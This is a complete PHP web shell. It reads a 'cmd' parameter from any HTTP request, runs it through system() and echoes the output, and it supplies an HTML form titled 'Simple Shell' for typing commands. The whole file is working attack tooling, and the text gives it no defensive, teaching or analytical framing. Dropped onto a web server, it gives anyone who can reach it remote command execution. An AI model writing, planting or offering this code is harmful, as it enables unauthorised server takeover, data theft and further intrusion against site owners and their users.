<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
Simple Shell: <form method="GET"><input type="text" name="cmd" size="80"><input type="submit" value="Execute"></form>